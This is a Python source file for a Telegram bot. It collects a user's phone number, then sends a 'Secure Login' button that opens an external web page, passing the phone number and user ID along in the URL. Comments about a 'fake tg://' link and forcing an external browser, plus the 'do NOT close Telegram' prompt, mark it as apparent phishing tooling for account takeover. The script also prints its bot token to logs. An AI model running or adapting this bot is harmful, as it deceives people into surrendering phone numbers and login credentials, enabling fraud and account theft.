import os
import urllib.parse
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Railway env vars
WEB_URL = os.getenv("WEB_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")

# DEBUG
print(f"[DEBUG] WEB_URL = {WEB_URL}")
print(f"[DEBUG] BOT_TOKEN = {BOT_TOKEN}")

if not BOT_TOKEN or len(BOT_TOKEN) < 30:
    print("FATAL: BOT_TOKEN missing!")
    exit(1)
if not WEB_URL:
    print("FATAL: WEB_URL missing!")
    exit(1)

# Fake tg:// is no longer needed — we use InlineKeyboard

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Share My Phone Number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text("Please share your phone number to continue.", reply_markup=reply_markup)

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact:
        await update.message.reply_text("Please share a valid contact.")
        return

    phone = contact.phone_number
    user_id = update.effective_user.id
    params = urllib.parse.urlencode({'user_id': user_id, 'phone': phone})
    final_url = f"{WEB_URL}?{params}"

    # SEND MESSAGE + INLINE BUTTON → FORCES EXTERNAL BROWSER
    keyboard = [[InlineKeyboardButton("Open Secure Login", url=final_url)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "Opening secure login in your browser...\n"
        "Please wait — do NOT close Telegram.",
        reply_markup=reply_markup
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
